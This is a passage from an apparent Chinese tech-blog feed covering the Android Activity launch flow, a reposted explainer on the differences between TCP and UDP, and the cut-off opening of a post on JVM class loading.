的组合就可以为每一个应用程序创建一个 ProcessRecord。每次在新建新进程前的时候会先判断这个 ProcessRecord 是否已存在，如果已经存在就不会新建进程了，这就属于应用内打开 Activity 的过程了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActivityManagerService.startProcessLocked()</span><br><span class="line">&#x2F;&#x2F;进程不存在请求 Zygote 创建新进程。 创建成功后切换到新进程。</span><br></pre></td></tr></table></figure><p>进程创建成功切换至 App 进程，进入 app 进程后将 ActivityThread 类加载到新进程，并调用 ActivityThread.main() 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ActivityThread.main()</span><br><span class="line">&#x2F;&#x2F;创建主线程的 Looper 对象，创建 ActivityThread 对象，ActivityThread.attach() 建立 Binder 通道，开启 Looper.loop() 消息循环。</span><br><span class="line"></span><br><span class="line">ActivityThread.attach()</span><br><span class="line">&#x2F;&#x2F;开启虚拟机各项功能，创建 ActivityManagerProxy 对象，调用基于 IActivityManager 接口的 Binder 通道 ActivityManagerProxy.attachApplication()。</span><br><span class="line"></span><br><span class="line">ActivityManagerProxy.attachApplication()</span><br><span class="line">&#x2F;&#x2F;发送 ATTACH_APPLICATION_TRANSACTION 命令</span><br></pre></td></tr></table></figure><p>此时只创建了应用程序的 ActivityThread 和 ApplicationThread，和开启了 Handler 消息循环机制，其他的都还未创建， ActivityThread.attach(false) 又会最终到 ActivityMangerService 的 attachApplication，这个工程其实是将本地的 ApplicationThread 传递到 ActivityMangerService。然后 ActivityMangerService 就可以通过 ApplicationThread 的代理 ApplicationThreadProxy 来调用应用程序 ApplicationThread.bindApplication，通知应用程序的 ApplicationThread 已和 ActivityMangerService 绑定，可以不借助其他进程帮助直接通信了。此时 Launcher 的任务也算是完成了。</p><p>在 system_server 进程中的服务端 ActivityManagerService 收到 ATTACH_APPLICATION_TRANSACTION 命令后进行处理，调用 attachApplication()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ActivityMangerService.attachApplication() -&gt; attachApplicationLocked()</span><br><span class="line">&#x2F;&#x2F;首先会获取到进程信息 ProcessRecord。 绑定死亡通知，移除进程启动超时消息。 获取到应用 ApplicationInfo 并绑定应用 IApplicationThread.bindApplication(appInfo)。</span><br><span class="line">&#x2F;&#x2F;然后检查 App 所需组件。</span><br></pre></td></tr></table></figure><ul><li>Activity: 检查最顶层可见的 Activity 是否等待在该进程中运行，调用 ActivityStackSupervisor.attachApplicationLocked()。</li><li>Service：寻找所有需要在该进程中运行的服务，调用 ActiveServices.attachApplicationLocked()。</li><li>Broadcast：检查是否在这个进程中有下一个广播接收者，调用 sendPendingBroadcastsLocked()。<br>此处讨论 Activity 的启动过程，只讨论 ActivityStackSupervisor.attachApplicationLocked() 方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ActivityStackSupervisor.attachApplicationLocked() -&gt; realStartActivityLocked()</span><br><span class="line">&#x2F;&#x2F;将该进程设置为前台进程 PROCESS_STATE_TOP，调用 ApplicationThreadProxy.scheduleLaunchActivity()。</span><br><span class="line"></span><br><span class="line">ApplicationThreadProxy.scheduleLaunchActivity()</span><br><span class="line">&#x2F;&#x2F;发送 SCHEDULE_LAUNCH_ACTIVITY_TRANSACTION 命令</span><br></pre></td></tr></table></figure><p>发送送完 SCHEDULE_LAUNCH_ACTIVITY_TRANSACTION 命令，还会发送 BIND_APPLICATION_TRANSACTION 命令来创建 Application。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ApplicationThreadProxy.bindApplication()</span><br><span class="line">&#x2F;&#x2F;发送 BIND_APPLICATION_TRANSACTION 命令</span><br></pre></td></tr></table></figure><h1 id="App-进程初始化"><a href="#App-进程初始化" class="headerlink" title="App 进程初始化"></a>App 进程初始化</h1><p>在 app 进程中，收到 BIND_APPLICATION_TRANSACTION 命令后调用 ActivityThread.bindApplication()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActivityThread.bindApplication()</span><br><span class="line">&#x2F;&#x2F;缓存 Service，初始化 AppBindData，发送消息 H.BIND_APPLICATION。</span><br></pre></td></tr></table></figure><p>ApplicationThreadProxy.bindApplication(…) 会传来这个应用的一些信息，如ApplicationInfo，Configuration 等，在 ApplicationThread.bindApplication 里会待信息封装成AppBindData，通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendMessage(H.BIND_APPLICATION, data)</span><br></pre></td></tr></table></figure><p>将信息放到应用里的消息队列里，通过 Handler 消息机制，在 ActivityThread.handleMeaasge 里处理 H.BIND_APPLICATION 的信息，调用 AplicationThread.handleBindApplication。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">handleBindApplication(AppBindData data) &#123;</span><br><span class="line">    Process.setArgV0(data.processName);&#x2F;&#x2F;设置进程名</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F;初始化 mInstrumentation</span><br><span class="line">    if(data.mInstrumentation!&#x3D;null) &#123;</span><br><span class="line">        mInstrumentation &#x3D; (Instrumentation) cl.loadClass(data.instrumentationName.getClassName()).newInstance();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        mInstrumentation &#x3D; new Instrumentation();</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;创建Application，data.info 是个 LoadedApk 对象。</span><br><span class="line">    Application app &#x3D; data.info.makeApplication(data.restrictedBackupMode, null);</span><br><span class="line">    mInitialApplication &#x3D; app;</span><br><span class="line">    &#x2F;&#x2F;调用 Application 的 onCreate()方法。</span><br><span class="line">    mInstrumentation.callApplicationOnCreate(app);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Application makeApplication(boolean forceDefaultAppClass,Instrumentation instrumentation) &#123;</span><br><span class="line">    </span><br><span class="line">    if (mApplication !&#x3D; null) &#123;   </span><br><span class="line">       return mApplication;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String appClass &#x3D; mApplicationInfo.className;</span><br><span class="line">    java.lang.ClassLoader cl &#x3D; getClassLoader();</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;此时新建一个 Application 的 ContextImpl 对象，</span><br><span class="line">    ContextImpl appContext &#x3D; ContextImpl.createAppContext(mActivityThread, this);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;通过在 handleBindApplication 创建的 mInstrumentation 对象新建一个 Application 对象，同时进行 attach。</span><br><span class="line">    app &#x3D; mActivityThread.mInstrumentation.newApplication(cl, appClass, appContext);</span><br><span class="line">    appContext.setOuterContext(app);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置进程名，获取 LoadedApk 对象，创建 ContextImpl 上下文</span><br><span class="line">&#x2F;&#x2F;LoadedApk.makeApplication() 创建 Application 对象，调用 Application.onCreate() 方法。</span><br></pre></td></tr></table></figure><p>Instrumentation：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Application newApplication(ClassLoader cl, String className, Context context) &#123;    </span><br><span class="line">    return newApplication(cl.loadClass(className), context);</span><br><span class="line">&#125;</span><br><span class="line">Instrumentation类：</span><br><span class="line">static public Application newApplication(Class&lt;?&gt; clazz, Context context)  &#123;</span><br><span class="line">    &#x2F;&#x2F;实例化 Application</span><br><span class="line">    Application app &#x3D; (Application)clazz.newInstance();     </span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; Application 和 context绑定</span><br><span class="line">    app.attach(context);    </span><br><span class="line">    return app;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;attach 就是将新建的 ContextImpl 赋值到 mBase，这个 ContextImpl 对象就是所有Application 内 Context 的具体实现，同时赋值一些其他的信息如 mLoadedApk。</span><br><span class="line">final void attach(Context context) &#123;    </span><br><span class="line">    mBase &#x3D; base;  </span><br><span class="line">    mLoadedApk &#x3D; ContextImpl.getImpl(context).mPackageInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时 Application 就创建好了，这点很重要，很多资料里说 Application 是在performLaunchActivity() 里创建的，因为 performLaunchActivity() 也有mInstrumentation.newApplication 这个调用，newApplication() 函数中可看出会先判断是否以及创建了 Application，如果之前已经创建，就返回已创建的 Application 对象。</p><h1 id="Activity-启动"><a href="#Activity-启动" class="headerlink" title="Activity 启动"></a>Activity 启动</h1><p>上面 fork 进程时会发送 SCHEDULE_LAUNCH_ACTIVITY_TRANSACTION 命令，在 app 进程中，收到 SCHEDULE_LAUNCH_ACTIVITY_TRANSACTION 命令后调用 ApplicationThread.scheduleLaunchActivity()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ApplicationThread.scheduleLaunchActivity()</span><br><span class="line">&#x2F;&#x2F;发送消息 H.LAUNCH_ACTIVITY。</span><br><span class="line"></span><br><span class="line">sendMessage(H.LAUNCH_ACTIVITY, r);</span><br><span class="line"></span><br><span class="line">ActivityThread.handleLaunchActivity()</span><br><span class="line">&#x2F;&#x2F;最终回调目标 Activity 的 onConfigurationChanged()，初始化 WindowManagerService。</span><br><span class="line">&#x2F;&#x2F;调用 ActivityThread.performLaunchActivity()</span><br><span class="line"></span><br><span class="line">ActivityThread.performLaunchActivity() &#123;</span><br><span class="line">    &#x2F;&#x2F;类似 Application 的创建过程，通过 classLoader 加载到 activity.</span><br><span class="line">    activity &#x3D; mInstrumentation.newActivity(classLoader, </span><br><span class="line">               component.getClassName(), r.intent);</span><br><span class="line">    &#x2F;&#x2F;因为 Activity 有界面，所以其 Context 是 ContextThemeWrapper 类型，但实现类仍是ContextImpl.</span><br><span class="line">    Context appContext &#x3D; createBaseContextForActivity(r, activity);</span><br><span class="line">    activity.attach(context,mInstrumentation,application,...);</span><br><span class="line">    &#x2F;&#x2F;与 Window 进行关联</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;attach 后调用 activity 的 onCreate()方法。</span><br><span class="line">    mInstrumentation.callActivityOnCreate(activity,...)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;在ActivityThread.handleLaunchActivity里，接着调用</span><br><span class="line"></span><br><span class="line">Activity.performCreate() -&gt; onCreate()</span><br><span class="line">&#x2F;&#x2F;最终回调目标 Activity 的 onCreate()。</span><br><span class="line"></span><br><span class="line">Activity.setContentView()</span><br><span class="line">&#x2F;&#x2F;设置 layout 布局</span><br><span class="line"></span><br><span class="line">ActivityThread.performResumeActivity()</span><br><span class="line">&#x2F;&#x2F;最终回调目标 Activity 的 onResume()。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与 Window 进行关联，具体过程详见：<a href="https://github.com/jeanboydev/Android-ReadTheFuckingSourceCode/blob/master/android/Android-Activity%E4%B8%8EWindow%E4%B8%8EView%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.md">Activity，Window，View 之间的关系</a></p><p>#总结<br>Activity 的整体启动流程如图所示：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-ef1bc13b37570270.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li><p>ActivityThread 是什么，它是一个线程吗，如何被启动的？<br>它不是一个线程，它是运行在 App 进程中的主线程中的一个方法中。当 App 进程创建时会执行 ActivityThread.main()，ActivityThread.main() 首先会创建 Looper 执行 Looper.prepareMainLooper()；然后创建 ActivityThread 并调用 ActivityThread.attach() 方法告诉 ActivityManagerService 我们创建了一个应用 并将 ApplicationThread 传给 ActivityManagerService；最后调用 Looper.loop()。</p></li><li><p>ActivityClientRecord 与 ActivityRecord 是什么？<br>记录 Activity 相关信息，比如：Window，configuration，ActivityInfo 等。<br>ActivityClientRecord 是客户端的，ActivityRecord 是 ActivityManagerService 服务端的。</p></li><li><p>Context 是什么，ContextImpl，ContextWapper 是什么？<br>Context 定义了 App 进程的相关环境，Context 是一个接口，ContextImpl 是子类，ContextWapper 是具体实现。<br>应用资源是在 Application 初始化的时候，也就是创建 Application，ContextImpl 的时候，ContextImpl 就包含这个路径，主要就是对就是 ResourcesManager 这个单例的引用。<br>可以看出每次创建 Application 和 Acitvity 以及 Service 时就会有一个 ContextImpl 实例，ContentProvider 和B roadcastReceiver 的 Context 是其他地方传入的。<br>所以 Context 数量 = Application 数量 + Activity 数量 + Service 数量，单进程情况下 Application 数量就是 1。</p></li><li><p>Instrumentation 是什么？<br>管理着组件Application,Activity，Service等的创建，生命周期调用。</p></li><li><p>Application 是什么，什么时候创建的，每个应用程序有几个 Application？<br>Application 是在 ActivityThread.handleBindApplication() 中创建的，一个进程只会创建一个 Application，但是一个应用如果有多个进程就会创建多个 Application 对象。</p></li><li><p>点击 Launcher 启动 Activity 和应用内部启动 Activity 的区别？<br>点击 Launcher 时会创建一个新进程来开启 Activity，而应用内打开 Activity，如果 Activity 不指定新进程，将在原来进程打开，是否开启新进程实在 ActivityManagerService 进行控制的，上面分析得到，每次开启新进程时会保存进程信息，默认为 应用包名 + 应用UID，打开 Activity 时会检查请求方的信息来判断是否需要新开进程。Launcher 打开 Activity 默认 ACTIVITY_NEW_TASK，新开一个 Activity 栈来保存 Activity 的信息。</p></li><li><p>Activity 启动过程，onCreate()，onResume() 回调时机及具体作用？<br>Activity.onCreate() 完成了 App 进程，Application，Activity 的创建，调用 setContentView() 给 Activity 设置了 layout 布局。<br>Activity.onResume() 完成了 Activity 中 Window 与 WindowManager 的关联，并对所有子 View 进行渲染并显示</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP UDP 区别</title>
      <link href="/2021/08/15/TCP-UDP-%E5%8C%BA%E5%88%AB/"/>
      <url>/2021/08/15/TCP-UDP-%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>[转] <a href="https://www.cnblogs.com/fundebug/p/differences-of-tcp-and-udp.html">一文搞懂TCP与UDP的区别</a></p><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>网络协议是每个前端工程师都必须要掌握的知识，TCP/IP 中有两个具有代表性的传输层协议，分别是 TCP 和 UDP，本文将介绍下这两者以及它们之间的区别。</p><h1 id="一、TCP-IP网络模型"><a href="#一、TCP-IP网络模型" class="headerlink" title="一、TCP/IP网络模型"></a>一、TCP/IP网络模型</h1><p>计算机与网络设备要相互通信，双方就必须基于相同的方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。</p><p>TCP/IP 是互联网相关的各类协议族的总称，比如：TCP，UDP，IP，FTP，HTTP，ICMP，SMTP 等都属于 TCP/IP 族内的协议。</p><p>TCP/IP模型是互联网的基础，它是一系列网络协议的总称。这些协议可以划分为四层，分别为链路层、网络层、传输层和应用层。</p><ul><li>链路层：负责封装和解封装IP报文，发送和接受ARP/RARP报文等。</li><li>网络层：负责路由以及把分组报文发送给目标网络或主机。</li><li>传输层：负责对报文进行分组和重组，并以TCP或UDP协议格式封装报文。</li><li>应用层：负责向用户提供应用程序，比如HTTP、FTP、Telnet、DNS、SMTP等。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d87c0b906bc740ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>在网络体系结构中网络通信的建立必须是在通信双方的对等层进行，不能交错。 在整个数据传输过程中，数据在发送端时经过各层时都要附加上相应层的协议头和协议尾（仅数据链路层需要封装协议尾）部分，也就是要对数据进行协议封装，以标识对应层所用的通信协议。接下去介绍TCP/IP 中有两个具有代表性的传输层协议—-TCP 和 UDP。</li></ul><h4 id="二、UDP"><a href="#二、UDP" class="headerlink" title="二、UDP"></a>二、UDP</h4><p>UDP协议全称是用户数据报协议，在网络中它与TCP协议一样用于处理数据包，是一种无连接的协议。在OSI模型中，在第四层——传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p><p>它有以下几个特点：</p><h4 id="1-面向无连接"><a href="#1-面向无连接" class="headerlink" title="1. 面向无连接"></a><strong>1. 面向无连接</strong></h4><p>首先 UDP 是不需要和 TCP一样在发送数据前进行三次握手建立连接的，想发数据就可以开始发送了。并且也只是数据报文的搬运工，不会对数据报文进行任何拆分和拼接操作。</p><p>具体来说就是：</p><p>在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了<br>在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作</p><h4 id="2-有单播，多播，广播的功能"><a href="#2-有单播，多播，广播的功能" class="headerlink" title="2. 有单播，多播，广播的功能"></a><strong>2. 有单播，多播，广播的功能</strong></h4><p>UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。</p><h4 id="3-UDP是面向报文的"><a href="#3-UDP是面向报文的" class="headerlink" title="3. UDP是面向报文的"></a><strong>3. UDP是面向报文的</strong></h4><p>发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文</p><h4 id="4-不可靠性"><a href="#4-不可靠性" class="headerlink" title="4. 不可靠性"></a><strong>4. 不可靠性</strong></h4><p>首先不可靠性体现在无连接上，通信都不需要建立连接，想发就发，这样的情况肯定不可靠。<br>并且收到什么数据就传递什么数据，并且也不会备份数据，发送数据也不会关心对方是否已经正确接收到数据了。<br>再者网络环境时好时坏，但是 UDP 因为没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4b0ae3ce54c8cff6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>从上面的动态图可以得知，UDP只会把想发的数据报文一股脑的丢给对方，并不在意数据有无安全完整到达。</p><h4 id="5-头部开销小，传输数据报文时是很高效的。"><a href="#5-头部开销小，传输数据报文时是很高效的。" class="headerlink" title="5. 头部开销小，传输数据报文时是很高效的。"></a><strong>5. 头部开销小，传输数据报文时是很高效的。</strong></h4><p><img src="https://upload-images.jianshu.io/upload_images/15531792-80b3da9cba6062a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>UDP 头部包含了以下几个数据：</p><ul><li>两个十六位的端口号，分别为源端口（可选字段）和目标端口</li><li>整个数据报文的长度</li><li>整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误</li></ul><p>因此 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的</p><h1 id="三、TCP"><a href="#三、TCP" class="headerlink" title="三、TCP"></a>三、TCP</h1><p>当一台计算机想要与另一台计算机通讯时，两台计算机之间的通信需要畅通且可靠，这样才能保证正确收发数据。例如，当你想查看网页或查看电子邮件时，希望完整且按顺序查看网页，而不丢失任何内容。当你下载文件时，希望获得的是完整的文件，而不仅仅是文件的一部分，因为如果数据丢失或乱序，都不是你希望得到的结果，于是就用到了TCP。</p><p>TCP协议全称是传输控制协议是一种面向连接的、可靠的、基于字节流的传输层通信协议，由 IETF 的RFC 793定义。TCP 是面向连接的、可靠的流协议。流就是指不间断的数据结构，你可以把它想象成排水管中的水流。</p><h4 id="1-TCP连接过程"><a href="#1-TCP连接过程" class="headerlink" title="1. TCP连接过程"></a>1. TCP连接过程</h4><p>如下图所示，可以看到建立一个TCP连接的过程为（三次握手的过程）:<br><img src="https://upload-images.jianshu.io/upload_images/15531792-729de4d660a17be1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>第一次握手</strong></p><p>客户端向服务端发送连接请求报文段。该报文段中包含自身的数据通讯初始序号。请求发送后，客户端便进入 SYN-SENT 状态。</p><p><strong>第二次握手</strong></p><p>服务端收到连接请求报文段后，如果同意连接，则会发送一个应答，该应答中也会包含自身的数据通讯初始序号，发送完成后便进入 SYN-RECEIVED 状态。</p><p><strong>第三次握手</strong></p><p>当客户端收到连接同意的应答后，还要向服务端发送一个确认报文。客户端发完这个报文段后便进入 ESTABLISHED 状态，服务端收到这个应答后也进入 ESTABLISHED 状态，此时连接建立成功。</p><p>这里可能大家会有个疑惑：为什么 TCP 建立连接需要三次握手，而不是两次？这是因为这是为了防止出现失效的连接请求报文段被服务端接收的情况，从而产生错误。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d4f228f014d4a199.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2-TCP断开链接"><a href="#2-TCP断开链接" class="headerlink" title="2. TCP断开链接"></a>2. TCP断开链接</h4><p><img src="https://upload-images.jianshu.io/upload_images/15531792-f753cae616294ebe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>TCP 是全双工的，在断开连接时两端都需要发送 FIN 和 ACK。</p><p><strong>第一次握手</strong></p><p>若客户端 A 认为数据发送完成，则它需要向服务端 B 发送连接释放请求。</p><p><strong>第二次握手</strong></p><p>B 收到连接释放请求后，会告诉应用层要释放 TCP 链接。然后会发送 ACK 包，并进入 CLOSE_WAIT 状态，此时表明 A 到 B 的连接已经释放，不再接收 A 发的数据了。但是因为 TCP 连接是双向的，所以 B 仍旧可以发送数据给 A。</p><p><strong>第三次握手</strong></p><p>B 如果此时还有没发完的数据会继续发送，完毕后会向 A 发送连接释放请求，然后 B 便进入 LAST-ACK 状态。</p><p><strong>第四次握手</strong></p><p>A 收到释放请求后，向 B 发送确认应答，此时 A 进入 TIME-WAIT 状态。该状态会持续 2MSL（最大段生存期，指报文段在网络中生存的时间，超时会被抛弃） 时间，若该时间段内没有 B 的重发请求的话，就进入 CLOSED 状态。当 B 收到确认应答后，也便进入 CLOSED 状态。</p><h4 id="3-TCP协议的特点"><a href="#3-TCP协议的特点" class="headerlink" title="3. TCP协议的特点"></a>3. TCP协议的特点</h4><ul><li><strong>面向连接</strong></li></ul><p>面向连接，是指发送数据之前必须在两端建立连接。建立连接的方法是“三次握手”，这样能建立可靠的连接。建立连接，是为数据的可靠传输打下了基础。</p><ul><li><strong>仅支持单播传输</strong></li></ul><p>每条TCP传输连接只能有两个端点，只能进行点对点的数据传输，不支持多播和广播传输方式。</p><ul><li><p><strong>面向字节流</strong><br>TCP不像UDP一样那样一个个报文独立地传输，而是在不保留报文边界的情况下以字节流方式进行传输。</p></li><li><p><strong>可靠传输</strong></p></li></ul><p>对于可靠传输，判断丢包，误码靠的是TCP的段编号以及确认号。TCP为了保证报文传输的可靠，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的字节发回一个相应的确认(ACK)；如果发送端实体在合理的往返时延(RTT)内未收到确认，那么对应的数据（假设丢失了）将会被重传。</p><ul><li><strong>提供拥塞控制</strong></li></ul><p>当网络出现拥塞的时候，TCP能够减小向网络注入数据的速率和数量，缓解拥塞</p><ul><li><strong>TCP提供全双工通信</strong><br>TCP允许通信双方的应用程序在任何时候都能发送数据，因为TCP连接的两端都设有缓存，用来临时存放双向通信的数据。当然，TCP可以立即发送一个数据段，也可以缓存一段时间以便一次发送更多的数据段（最大的数据段大小取决于MSS）</li></ul><h1 id="四、TCP和UDP的比较"><a href="#四、TCP和UDP的比较" class="headerlink" title="四、TCP和UDP的比较"></a>四、TCP和UDP的比较</h1><h4 id="1-对比"><a href="#1-对比" class="headerlink" title="1. 对比"></a>1. 对比</h4><table><thead><tr><th></th><th>UDP</th><th>TCP</th></tr></thead><tbody><tr><td>是否连接</td><td>无连接</td><td>面向连接</td></tr><tr><td>是否可靠</td><td>不可靠传输，不使用流量控制和拥塞控制</td><td>可靠传输，使用流量控制和拥塞控制</td></tr><tr><td>连接对象个数</td><td>支持一对一，一对多，多对一和多对多交互通信</td><td>只能是一对一通信</td></tr><tr><td>传输方式</td><td>面向报文</td><td>面向字节流</td></tr><tr><td>首部开销</td><td>首部开销小，仅8字节</td><td>首部最小20字节，最大60字节</td></tr><tr><td>适用场景</td><td>适用于实时应用（IP电话、视频会议、直播等)</td><td>适用于要求可靠传输的应用，例如文件传输</td></tr></tbody></table><h4 id="2-总结"><a href="#2-总结" class="headerlink" title="2. 总结"></a>2. 总结</h4><ul><li>TCP向上层提供面向连接的可靠服务 ，UDP向上层提供无连接不可靠服务。</li><li>虽然 UDP 并没有 TCP 传输来的准确，但是也能在很多实时性要求高的地方有所作为</li><li>对数据准确性要求高，速度可以相对较慢的，可以选用TCP</li></ul><h3 id="参考文章与书籍"><a href="#参考文章与书籍" class="headerlink" title="参考文章与书籍"></a>参考文章与书籍</h3><ul><li><a href="https://www.bilibili.com/video/av40163489?from=search&seid=11224550652008575322">计算机网络简明教程及仿真实验</a></li><li><a href="https://www.bilibili.com/video/av31151326?from=search&seid=11224550652008575322">TCP和UDP的区别</a></li><li><a href="https://juejin.im/book/5bdc715fe51d454e755f75ef/section/5bdc729af265da615a414603">前端面试之道</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jvm 类加载机制和流程</title>
      <link href="/2021/08/08/Jvm-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/08/08/Jvm-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://segmentfault.com/a/1190000037574626"># <a href="https://segmentfault.com/a/1190000037574626">jvm类加载器，类加载机制详解，看这一篇就够了</a></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>jvm的启动是通过引导类加载器（bootstrap class loader）创建一个初始类（initial class）来完成的，这个类是由jvm的具体实现指定的。[来自官方规范]</p><p>jvm组成结构之一就是<code>类装载器子系统</code>，我们今天就来仔细讲讲这个组件。</p><h4 id="Java代码执行流程图"><a href="#Java代码执行流程图" class="headerlink" title="Java代码执行流程图"></a>Java代码执行流程图</h4><p>大家通过这个流程图，了解一下我们写好的Java代码是如何执行的，其中要经历类加载器这个流程，我们就来仔细讲讲这里面的知识点。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-ffbdb54a2c78c49b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="类加载子系统"><a href="#类加载子系统" class="headerlink" title="类加载子系统"></a>类加载子系统</h4><p><img src="https://upload-images.jianshu.io/upload_images/15531792-7fe97d957c50216d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>暂时看不懂这两张图没关系，跟着往下看<br><img 